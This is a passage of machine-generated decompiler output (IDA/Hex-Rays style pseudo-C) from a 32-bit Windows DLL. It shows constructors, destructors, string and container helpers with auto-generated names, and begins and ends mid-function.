  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10039151) --------------------------------------------------------
_DWORD *__thiscall sub_10039151(_DWORD *Block, char a2)
{
  sub_100381BE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003916D) --------------------------------------------------------
char *__usercall sub_1003916D@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0x14u, *((_DWORD *)a1 - 1), (void (__thiscall *)(void *))sub_100380FA);
  j_j__free(v1);
  return v1;
}

//----- (1003918B) --------------------------------------------------------
_DWORD *__thiscall sub_1003918B(_DWORD *Block, char a2)
{
  sub_10038304(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100391A7) --------------------------------------------------------
int __userpurge sub_100391A7@<eax>(int a1@<edi>, int a2)
{
  sub_10039511((_DWORD *)a2, a1);
  *(_BYTE *)(a2 + 16) = *(_BYTE *)(a1 + 16);
  *(_BYTE *)(a2 + 17) = *(_BYTE *)(a1 + 17);
  return a2;
}

//----- (100391DB) --------------------------------------------------------
_DWORD *__thiscall sub_100391DB(_DWORD *Block, char a2)
{
  sub_100387C7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100391F7) --------------------------------------------------------
_DWORD *__thiscall sub_100391F7(_DWORD *Block, char a2)
{
  sub_10038932(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10039213) --------------------------------------------------------
_DWORD *__thiscall sub_10039213(_DWORD *Block, char a2)
{
  sub_10038A58(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003922F) --------------------------------------------------------
char *__usercall sub_1003922F@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0x48u, *((_DWORD *)a1 - 1), (void (__thiscall *)(void *))sub_100392FB);
  j_j__free(v1);
  return v1;
}

//----- (1003924D) --------------------------------------------------------
_DWORD *__thiscall sub_1003924D(void *this, _DWORD *a2)
{
  sub_1000D372(a2, (int)this);
  sub_1000D372(a2 + 2, (int)this + 8);
  sub_1000D372(a2 + 4, (int)this + 16);
  sub_1000D372(a2 + 6, (int)this + 24);
  sub_1000D372(a2 + 8, (int)this + 32);
  sub_1000D372(a2 + 10, (int)this + 40);
  sub_1000D372(a2 + 12, (int)this + 48);
  sub_1000D372(a2 + 14, (int)this + 56);
  sub_1000D372(a2 + 16, (int)this + 64);
  return a2;
}

//----- (100392FB) --------------------------------------------------------
void __thiscall sub_100392FB(int *this)
{
  sub_1000D3AD(this + 16);
  sub_1000D3AD(this + 14);
  sub_1000D3AD(this + 12);
  sub_1000D3AD(this + 10);
  sub_1000D3AD(this + 8);
  sub_1000D3AD(this + 6);
  sub_1000D3AD(this + 4);
  sub_1000D3AD(this + 2);
  sub_1000D3AD(this);
}

//----- (10039380) --------------------------------------------------------
LONG *__usercall sub_10039380@<eax>(LONG *a1@<edi>, LONG *a2@<esi>)
{
  sub_10001236(a1 + 1, a2 + 1);
  sub_10001236(a1 + 3, a2 + 3);
  sub_10001236(a1 + 5, a2 + 5);
  sub_10001236(a1 + 7, a2 + 7);
  sub_10001236(a1 + 9, a2 + 9);
  sub_10001236(a1 + 11, a2 + 11);
  sub_10001236(a1 + 13, a2 + 13);
  sub_10001236(a1 + 15, a2 + 15);
  sub_10001236(a1 + 17, a2 + 17);
  return a2;
}

//----- (100393E6) --------------------------------------------------------
void __thiscall sub_100393E6(_DWORD *this)
{
  sub_1000D17D(this, &word_1017DB80);
  sub_1000D17D(this + 2, &word_1017DB80);
  sub_1000D17D(this + 4, &word_1017DB80);
  sub_1000D17D(this + 6, &word_1017DB80);
  sub_1000D17D(this + 8, &word_1017DB80);
  sub_1000D17D(this + 10, &word_1017DB80);
  sub_1000D17D(this + 12, &word_1017DB80);
  sub_1000D17D(this + 14, &word_1017DB80);
  sub_1000D17D(this + 16, &word_1017DB80);
}

//----- (1003947F) --------------------------------------------------------
char *__thiscall sub_1003947F(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x10u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_10038C5A);
    if ( (a2 & 1) != 0 )
      j_j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_10038C5A(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (100394C8) --------------------------------------------------------
char *__thiscall sub_100394C8(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x10u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_10037CC9);
    if ( (a2 & 1) != 0 )
      j_j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_10037CC9((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (10039511) --------------------------------------------------------
_DWORD *__stdcall sub_10039511(_DWORD *a1, int a2)
{
  sub_10032FFF(a1);
  *a1 = &off_10103548;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  sub_10042B02(a2, (int)a1);
  return a1;
}
// 10103548: using guessed type int (__thiscall *off_10103548)(void *Block, char);

//----- (10039550) --------------------------------------------------------
void __thiscall sub_10039550(_DWORD *this)
{
  *this = &off_10103A4C;
  sub_1000D17D(this + 1, &word_1017DB80);
}
// 10103A4C: using guessed type int (__thiscall *off_10103A4C)(void *, char);

//----- (10039581) --------------------------------------------------------
void __usercall sub_10039581(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x484u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0x48u,
      16,
      (void (__thiscall *)(void *))sub_100393E6,
      (void (__thiscall *)(void *))sub_100392FB);
  }
  a1[3] = v1;
}

//----- (1003961F) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003961F(
        Concurrency::details::UMSFreeThreadProxyFactory *Block,
        char a2)
{
  Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003963B) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003963B(
        Concurrency::details::UMSFreeThreadProxyFactory *a1,
        int a2,
        __int16 a3)
{
  wchar_t *v3; // eax
  int v4; // eax
  wchar_t *v5; // eax
  int v6; // eax
  wchar_t *v7; // eax
  int v8; // eax
  wchar_t *v9; // eax
  int v10; // eax
  wchar_t *v11; // eax
  int v12; // eax
  wchar_t *v13; // eax
  int v14; // eax
  wchar_t *v15; // eax
  int v16; // eax
  int v18; // [esp+0h] [ebp-2Ch] BYREF
  _DWORD *v19; // [esp+4h] [ebp-28h]
  int v20[4]; // [esp+18h] [ebp-14h] BYREF
  int v21; // [esp+28h] [ebp-4h]

  v20[1] = (int)&v18;
  sub_1000D372(&v18, a2);
  v21 = -1;
  sub_1004AF1C((int)a1, a3, v18, (int)v19);
  v21 = 1;
  v19 = (_DWORD *)((char *)a1 + 56);
  *(_DWORD *)a1 = &off_10103BFC;
  sub_1003AA6F(v19);
  LOBYTE(v21) = 2;
  sub_1003AA6F((_DWORD *)a1 + 23);
  LOBYTE(v21) = 3;
  v3 = (wchar_t *)sub_1000CC40((int)&unk_101760A4);
  sub_1000D17D(v20, v3);
  LOBYTE(v21) = 4;
  v4 = *((_DWORD *)a1 + 14);
  a2 = 2;
  (*(void (__thiscall **)(char *, int *, int *))(v4 + 24))((char *)a1 + 56, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v5 = (wchar_t *)sub_1000CC40((int)&unk_101760E0);
  sub_1000D17D(v20, v5);
  LOBYTE(v21) = 5;
  v6 = *((_DWORD *)a1 + 14);
  a2 = 4;
  (*(void (__thiscall **)(char *, int *, int *))(v6 + 24))((char *)a1 + 56, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v7 = (wchar_t *)sub_1000CC40((int)&unk_1017612C);
  sub_1000D17D(v20, v7);
  LOBYTE(v21) = 6;
  v8 = *((_DWORD *)a1 + 14);
  a2 = 128;
  (*(void (__thiscall **)(char *, int *, int *))(v8 + 24))((char *)a1 + 56, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v9 = (wchar_t *)sub_1000CC40((int)&unk_1017616C);
  sub_1000D17D(v20, v9);
  LOBYTE(v21) = 7;
  v10 = *((_DWORD *)a1 + 14);
  a2 = 8;
  (*(void (__thiscall **)(char *, int *, int *))(v10 + 24))((char *)a1 + 56, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v11 = (wchar_t *)sub_1000CC40((int)&unk_101761AC);
  sub_1000D17D(v20, v11);
  LOBYTE(v21) = 8;
  v12 = *((_DWORD *)a1 + 23);
  a2 = 32;
  (*(void (__thiscall **)(char *, int *, int *))(v12 + 24))((char *)a1 + 92, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v13 = (wchar_t *)sub_1000CC40((int)&unk_101761E4);
  sub_1000D17D(v20, v13);
  LOBYTE(v21) = 9;
  v14 = *((_DWORD *)a1 + 23);
  a2 = 64;
  (*(void (__thiscall **)(char *, int *, int *))(v14 + 24))((char *)a1 + 92, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  v15 = (wchar_t *)sub_1000CC40((int)&unk_1017621C);
  sub_1000D17D(v20, v15);
  LOBYTE(v21) = 10;
  v16 = *((_DWORD *)a1 + 23);
  a2 = 16;
  (*(void (__thiscall **)(char *, int *, int *))(v16 + 24))((char *)a1 + 92, &a2, v20);
  LOBYTE(v21) = 3;
  sub_1000D3AD(v20);
  return a1;
}
// 10103BFC: using guessed type int (__thiscall *off_10103BFC)(void *Block, char);

//----- (1003983D) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003983D(
        Concurrency::details::UMSFreeThreadProxyFactory *Block,
        char a2)
{
  sub_10039859(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10039859) --------------------------------------------------------
void __thiscall sub_10039859(Concurrency::details::UMSFreeThreadProxyFactory *this)
{
  *(_DWORD *)this = &off_10103BFC;
  sub_1003AAB7((_DWORD *)this + 23);
  sub_1003AAB7((_DWORD *)this + 14);
  Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory(this);
}
// 10103BFC: using guessed type int (__thiscall *off_10103BFC)(void *Block, char);

//----- (1003989C) --------------------------------------------------------
int __usercall sub_1003989C@<eax>(int a1@<ecx>, int a2@<ebp>)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  _DWORD *v5; // eax
  volatile LONG *v6; // ecx
  _DWORD *v7; // ebx
  int v8; // ecx
  int v9; // ecx
  int *v10; // eax
  _DWORD *v11; // eax
  int *v12; // eax
  _DWORD *v13; // ecx
  LONG *v14; // eax
  int *v15; // ecx
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  volatile LONG *v18; // ecx
  LONG *v19; // eax
  int v20; // esi
  unsigned int v22; // [esp-1Ch] [ebp-A4h]
  _DWORD *v23; // [esp-18h] [ebp-A0h]
  unsigned int v24; // [esp-18h] [ebp-A0h]
  volatile LONG *v25; // [esp-14h] [ebp-9Ch] BYREF
  int v26; // [esp-10h] [ebp-98h] BYREF
  int v27; // [esp-Ch] [ebp-94h]
  volatile LONG *v28; // [esp-8h] [ebp-90h] BYREF
  volatile LONG *v29; // [esp-4h] [ebp-8Ch]

  *(_DWORD *)(a2 + 84) = a1;
  v3 = operator new(0x28u);
  v4 = v29;
  *(_DWORD *)(a2 + 108) = v3;
  *(_DWORD *)(a2 - 4) = 0;
  if ( v3 )
  {
    v29 = v4;
    v28 = v4;
    *(_DWORD *)(a2 + 104) = &v28;
    sub_1000B964(&v28);
    *(_BYTE *)(a2 - 4) = 1;
    v27 = -1;
    v26 = 128;
    v25 = (volatile LONG *)(a1 + 48);
    v23 = *(_DWORD **)(a2 + 108);
    *(_BYTE *)(a2 - 4) = 0;
    v5 = sub_1000BA6E(-1, 0x80000000, v23, (int)v25, v26, v27, (int)v28, v29);
  }
  else
  {
    v5 = 0;
  }
  *(_DWORD *)(a2 - 4) = -1;
  sub_10050B91((_DWORD *)(a2 + 76), (int)v5);
  *(_DWORD *)(a2 - 4) = 2;
  v29 = v6;
  v28 = v6;
  *(_DWORD *)(a2 + 104) = &v28;
  v29 = *(volatile LONG **)(a2 + 80);
  v28 = *(volatile LONG **)(a2 + 76);
  InterlockedIncrement(v29);
  *(_BYTE *)(a2 - 4) = 3;
  v27 = a2 - 120;
  *(_BYTE *)(a2 - 4) = 2;
  sub_100250DF((_DWORD *)v27, (int)v28, v29);
  *(_BYTE *)(a2 - 4) = 4;
  *(_DWORD *)(a2 + 108) = 0;
  *(_BYTE *)(a2 - 4) = 5;
  sub_100254EB(a2 - 120, (_DWORD *)(a2 + 88));
  *(_BYTE *)(a2 - 4) = 6;
  v7 = 0;
  sub_1000B1F3(0, a2 + 16, 0);
  *(_BYTE *)(a2 - 4) = 7;
  sub_1000B1F3(0, a2 + 36, 0);
  *(_BYTE *)(a2 - 4) = 8;
  sub_1000B79B(v8, (_DWORD *)(a2 + 16));
  sub_1000B79B(v9, (_DWORD *)(a2 + 36));
  while ( 1 )
  {
    *(_DWORD *)(a2 + 72) = v7;
    if ( (unsigned int)v7 >= *(_DWORD *)(a2 + 100) )
      break;
    v10 = (int *)(*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)(a2 + 88) + 44))(a2 + 88, v7);
    v11 = sub_10020765(*v10, (_DWORD *)(a2 + 8));
    *(_BYTE *)(a2 - 4) = 9;
    *(_BYTE *)(a2 + 115) = sub_1000DE70((int)v11, (int)&unk_10186BF0);
    *(_BYTE *)(a2 - 4) = 8;
    sub_1000D3AD((int *)(a2 + 8));
    v12 = (int *)(*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)(a2 + 88) + 44))(a2 + 88, v7);
    if ( *(_BYTE *)(a2 + 115) )
    {
      v27 = (int)v13;
      v26 = (int)v13;
      *(_DWORD *)(a2 + 104) = &v26;
      sub_10011AE0(v12, &v26);
      *(_BYTE *)(a2 - 4) = 10;
      v25 = v7;
      v24 = *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 88) + 44))(a2 + 88) + 28);
      *(_BYTE *)(a2 - 4) = 8;
      v14 = (LONG *)sub_10025748(a2 - 120, (void *)(a2 - 36), v24, v25, (volatile LONG *)v26);
      *(_BYTE *)(a2 - 4) = 11;
      sub_1000B3BD(v14, a2 + 16);
      *(_BYTE *)(a2 - 4) = 8;
      v15 = (int *)(a2 - 36);
    }
    else
    {
      v16 = sub_10020765(*v12, (_DWORD *)a2);
      *(_BYTE *)(a2 - 4) = 12;
      *(_BYTE *)(a2 + 115) = sub_1000DE70((int)v16, (int)&unk_10186BE0);
      *(_BYTE *)(a2 - 4) = 8;
      sub_1000D3AD((int *)a2);
      if ( !*(_BYTE *)(a2 + 115) )
        goto LABEL_11;
      v17 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)(a2 + 88) + 44))(a2 + 88, v7);
      v26 = (int)v18;
      v25 = v18;
      *(_DWORD *)(a2 + 104) = &v25;
      sub_10011AE0(v17, &v25);
      *(_BYTE *)(a2 - 4) = 13;
      v22 = *(_DWORD *)(*(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 88) + 44))(a2 + 88) + 28);
      *(_BYTE *)(a2 - 4) = 8;
      v19 = (LONG *)sub_10025748(a2 - 120, (void *)(a2 - 56), v22, v7, v25);
      *(_BYTE *)(a2 - 4) = 14;
      sub_1000B3BD(v19, a2 + 36);
      *(_BYTE *)(a2 - 4) = 8;
      v15 = (int *)(a2 - 56);
    }
    sub_1000B3DF(v15);
LABEL_11:
    v7 = (_DWORD *)((char *)v7 + 1);
  }
  sub_1000D2FA((_DWORD *)(a2 + 64), 0xFDE9u);
  *(_BYTE *)(a2 - 4) = 15;
  sub_1000D2FA((_DWORD *)(a2 + 56), 0xFDE9u);
  *(_BYTE *)(a2 - 4) = 16;
  v29 = (volatile LONG *)(a2 + 56);
  v20 = *(_DWORD *)(a2 + 84);
  sub_10039B6F(v20 + 92, v20, a2 + 56);
  sub_10039B6F(v20 + 56, v20, a2 + 64);
  *(_BYTE *)(a2 - 4) = 15;
  sub_1000D3AD((int *)(a2 + 56));
  *(_BYTE *)(a2 - 4) = 8;
  sub_1000D3AD((int *)(a2 + 64));
  *(_BYTE *)(a2 - 4) = 7;
  sub_1000B3DF((int *)(a2 + 36));
  *(_BYTE *)(a2 - 4) = 6;
  sub_1000B3DF((int *)(a2 + 16));
  *(_BYTE *)(a2 - 4) = 5;
  sub_10023DCC((_DWORD *)(a2 + 88));
  *(_DWORD *)(a2 - 4) = 4;
  *(_BYTE *)(a2 - 4) = 2;
  sub_10023D4C((int *)(a2 - 120));
  *(_DWORD *)(a2 - 4) = -1;
  sub_10020B81((void *)(a2 + 76));
  return *(_DWORD *)(a2 + 108);
}
// 1003990C: variable 'v6' is possibly undefined
// 10039974: variable 'v8' is possibly undefined
// 1003997C: variable 'v9' is possibly undefined
// 100399D0: variable 'v13' is possibly undefined
// 10039A51: variable 'v18' is possibly undefined

//----- (10039B6F) --------------------------------------------------------
void __userpurge sub_10039B6F(int a1@<edi>, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  wchar_t *v5; // eax
  wchar_t *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // ebx
  wchar_t *v12; // eax
  wchar_t *v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  int v18; // esi
  _DWORD *v19; // eax
  int v20; // esi
  int v21; // eax
  void *v22; // esi
  _DWORD *v23; // eax
  int v24; // [esp+18h] [ebp-80h] BYREF
  void *v25[2]; // [esp+1Ch] [ebp-7Ch] BYREF
  int v26; // [esp+24h] [ebp-74h] BYREF
  LONG v27; // [esp+28h] [ebp-70h] BYREF
  int v28[2]; // [esp+2Ch] [ebp-6Ch] BYREF
  int v29[2]; // [esp+34h] [ebp-64h] BYREF
  int v30[2]; // [esp+3Ch] [ebp-5Ch] BYREF
  int v31[2]; // [esp+44h] [ebp-54h] BYREF
  int v32[2]; // [esp+4Ch] [ebp-4Ch] BYREF
  int v33[2]; // [esp+54h] [ebp-44h] BYREF
  int v34[2]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v35[2]; // [esp+64h] [ebp-34h] BYREF
  int v36[2]; // [esp+6Ch] [ebp-2Ch] BYREF
  int v37[6]; // [esp+74h] [ebp-24h] BYREF
  int v38; // [esp+94h] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 36))(a1, v25);
  v38 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v25[0] + 4))(v25[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v25[0] + 12))(v25[0]);
    v4 = *(_DWORD *)(*(_DWORD *)((*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, v3) + 4) + 28);
    v5 = (wchar_t *)sub_1000CC40((int)&unk_10176254);
    sub_1000D17D(v29, v5);
    LOBYTE(v38) = 2;
    v6 = (wchar_t *)sub_1000CC40((int)&unk_10176280);
    sub_1000D17D(v28, v6);
    LOBYTE(v38) = 3;
    v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)v25[0] + 12))(v25[0]);
    v8 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, v7);
    v9 = sub_1000D5FF(v33, (int)v28, v8);
    LOBYTE(v38) = 4;
    v10 = sub_1000D5FF(v32, (int)v9, v29);
    LOBYTE(v38) = 5;
    v11 = sub_1000DF75(a3, (int)v10, 0);
    LOBYTE(v38) = 4;
    sub_1000D3AD(v32);
    LOBYTE(v38) = 3;
    sub_1000D3AD(v33);
    LOBYTE(v38) = 2;
    sub_1000D3AD(v28);
    LOBYTE(v38) = 0;
    sub_1000D3AD(v29);
    if ( v11 != -1 )
    {
      sub_1000D836(-2, a3, &v26, v11 + v4 + 2);
      LOBYTE(v38) = 6;
      v12 = (wchar_t *)sub_1000CC40((int)&unk_101762AC);
      sub_1000D17D(v31, v12);
      LOBYTE(v38) = 7;
      v13 = (wchar_t *)sub_1000CC40((int)&unk_101762D8);
      sub_1000D17D(v30, v13);
      LOBYTE(v38) = 8;
      v14 = (*(int (__thiscall **)(void *))(*(_DWORD *)v25[0] + 12))(v25[0]);
      v15 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, v14);
      v16 = sub_1000D5FF(v35, (int)v30, v15);
      LOBYTE(v38) = 9;
      v17 = sub_1000D5FF(v34, (int)v16, v31);
      LOBYTE(v38) = 10;
      v18 = sub_1000DF11(0, (int)&v26, (int)v17);
      LOBYTE(v38) = 9;
      sub_1000D3AD(v34);
      LOBYTE(v38) = 8;
      sub_1000D3AD(v35);
      LOBYTE(v38) = 7;
      sub_1000D3AD(v30);
      LOBYTE(v38) = 6;
      sub_1000D3AD(v31);
      if ( v18 != -1 )
      {
        v19 = sub_1000D836(v18, (int)&v26, v36, 0);
        LOBYTE(v38) = 11;
        sub_10001236(v19 + 1, &v27);
        LOBYTE(v38) = 6;
        sub_1000D3AD(v36);
        v20 = sub_1000B261((int)&v26, (int)v37, 0);
        LOBYTE(v38) = 12;
        v21 = (*(int (__thiscall **)(void *))(*(_DWORD *)v25[0] + 12))(v25[0]);
        (*(void (__thiscall **)(int, int, int))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v21, v20);
        LOBYTE(v38) = 6;
        sub_1000B3DF(v37);
      }
      LOBYTE(v38) = 0;
      sub_1000D3AD(&v26);
    }
    v22 = v25[0];
    if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)v25[0] + 4))() )
    {
      v23 = sub_1000E8EF(&v24);
      LOBYTE(v38) = 1;
      sub_100078FE((int)v23);
    }
    (*(void (__thiscall **)(void *))(*(_DWORD *)v22 + 16))(v22);
  }
  v38 = -1;
  sub_1003406C(v25);
}

//----- (10039E94) --------------------------------------------------------
_DWORD *__thiscall sub_10039E94(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_1003A06C(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10039F05) --------------------------------------------------------
void __thiscall sub_10039F05(_DWORD *this)
{
  *this = off_100FBF5C;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (10039F24) --------------------------------------------------------
_DWORD *__thiscall sub_10039F24(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103A90;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103A90: using guessed type int (__thiscall *off_10103A90)(void *Block, char);

//----- (10039F7A) --------------------------------------------------------
_DWORD *__thiscall sub_10039F7A(void *this, _DWORD *a2, void *Block)
{
  unsigned int v4; // eax
  void *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = Block;
  if ( (unsigned int)Block > v4 )
  {
    v6 = sub_1000E8EF(&Block);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  Block = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_10103A90;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_10039112(a2, (int)v7);
  return a2;
}
// 10103A90: using guessed type int (__thiscall *off_10103A90)(void *Block, char);

//----- (10039FFB) --------------------------------------------------------
_DWORD *__thiscall sub_10039FFB(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_1003A104(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1003A06C) --------------------------------------------------------
_DWORD *__stdcall sub_1003A06C(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103C48;
  a1[2] = off_10103D3C;
  sub_1000B1F3(0, (int)(a1 + 4), 0);
  a1[9] = 0;
  return a1;
}
// 10103C48: using guessed type int (__stdcall *off_10103C48)(char);
// 10103D3C: using guessed type int (__thiscall *off_10103D3C[2])(void *Block, char);

//----- (1003A0B8) --------------------------------------------------------
BOOL __thiscall sub_1003A0B8(int this)
{
  return *(_DWORD *)(this + 36) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003A0CB) --------------------------------------------------------
int __thiscall sub_1003A0CB(int this)
{
  _WORD *v2; // eax
  LONG *v3; // eax
  int v5; // [esp-4h] [ebp-10h]

  v2 = (_WORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                  *(_DWORD *)(this + 4) + 4,
                  *(_DWORD *)(this + 36));
  v5 = *(_DWORD *)(this + 36);
  *(_WORD *)(this + 12) = *v2;
  v3 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                 *(_DWORD *)(this + 4) + 20,
                 v5);
  sub_1000B3BD(v3, this + 16);
  return this + 8;
}

//----- (1003A104) --------------------------------------------------------
_DWORD *__stdcall sub_1003A104(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103C68;
  a1[2] = &off_10104418;
  sub_1000D17D(a1 + 4, (wchar_t *)&word_10102960);
  a1[6] = 0;
  return a1;
}
// 10103C68: using guessed type int (__stdcall *off_10103C68)(char);
// 10104418: using guessed type int (__thiscall *off_10104418)(void *Block, char);

//----- (1003A152) --------------------------------------------------------
int __thiscall sub_1003A152(int this)
{
  _WORD *v2; // eax
  int v3; // eax
  int v5; // [esp-4h] [ebp-8h]

  v2 = (_WORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                  *(_DWORD *)(this + 4) + 4,
                  *(_DWORD *)(this + 24));
  v5 = *(_DWORD *)(this + 24);
  *(_WORD *)(this + 12) = *v2;
  v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(*(_DWORD *)(this + 4) + 20, v5);
  sub_10001236((LONG *)(v3 + 4), (LONG *)(this + 20));
  return this + 8;
}

//----- (1003A188) --------------------------------------------------------
void **__thiscall sub_1003A188(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j_j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1003A1C7) --------------------------------------------------------
void __thiscall sub_1003A1C7(int this)
{
  *(_DWORD *)this = &off_10103B40;
  j_j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 10103B40: using guessed type int (__thiscall *off_10103B40)(void *Block, char);

//----- (1003A216) --------------------------------------------------------
int __thiscall sub_1003A216(_DWORD *this, __int16 *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  __int16 v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013419F);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_WORD *)(this[3] + 2 * i) = *(_WORD *)(this[3] + 2 * i - 2);
  result = this[3];
  *(_WORD *)(result + 2 * a3) = v9;
  ++this[1];
  return result;
}

//----- (1003A27E) --------------------------------------------------------
int __thiscall sub_1003A27E(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
